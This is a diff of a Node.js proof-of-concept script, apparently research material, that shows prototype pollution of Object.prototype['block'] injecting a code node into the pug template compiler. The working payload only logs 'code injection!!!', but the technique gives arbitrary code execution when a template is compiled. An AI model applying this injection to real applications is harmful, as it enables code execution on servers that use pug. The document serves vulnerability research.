@@ -1,3 +1,4 @@
+console.log("===========start===========")
 pug = require("pug")
 
 /* Payload Injection*/
@@ -10,41 +11,59 @@ pug = require("pug")
 // }
 
 // exp-2
-// Object.prototype['attrs'] = [];
-// Object.prototype['attributeBlocks'] = [];
-// Object.prototype['block'] = 
-// { 
+// Object.prototype['attrs'] = []; // helper porperty to make the control flow happen
+// Object.prototype['attributeBlocks'] = []; // helper porperty to make the control flow happen
+// Object.prototype['block'] = { 
 //   type: "Block",
-//   nodes: [
-//     {
-//       type:"Tag",
-//       name:"p",
-//       block:{
-//         type:"Block",
-//         nodes:[
-//           {
-//             type:"Code",
-//             val:"console.log('universal code injection!!!')",
-//             block:{
+//   nodes: [{
+//       type: "Tag",
+//       name: "p",
+//       block: {
+//         type: "Block",
+//         nodes: [{
+//             type: "Code",
+//             val: "console.log('code injection!!!')",
+//             block: { // this block is used to stop the infinite loop after we polluted the block property
 //               type: "Block",
-//               nodes:[
-//                 {
+//               nodes: [{
 //                   type: "Comment",
 //                   val: "End the visiting node process"
-//                 }
-//               ]
-//             }
-//           },
-//         ],
-//       },
-//     },
+//                 }]
+//           }}
+//       ]}
+//     }
+// ]}
+
+// Object.prototype['attrs'] = []; // helper porperty to make the control flow happen
+// Object.prototype['attributeBlocks'] = []; // helper porperty to make the control flow happen
+// Object.prototype['block'] = { 
+//     type: "Block",
+//     nodes: [{
+//         type: "Code",
+//         val: "console.log('code injection!!!')",
+//         block: { // this block is used to stop the infinite loop after we polluted the block property
+//           type: "Block",
+//           nodes: [{
+//               type: "Comment",
+//               val: "End the visiting node process"
+//             }]
+//       }}
 //   ]}
 
+Object.prototype['block'] = { 
+    type: "Code",
+    val: "console.log('code injection!!!')",
+    block: { // this block is used to stop the infinite loop after we polluted the block property
+        type: "Comment",
+        val: "End the visiting node process"
+  }
+}
+
 // for node-find-undefined
-console.log("===========start===========")
 
 
 const template = pug.compile(`h1= msg`);
+console.log(template({msg: "Hello World"}));
 
 // for node-find-undefined
 console.log("===========end===========")
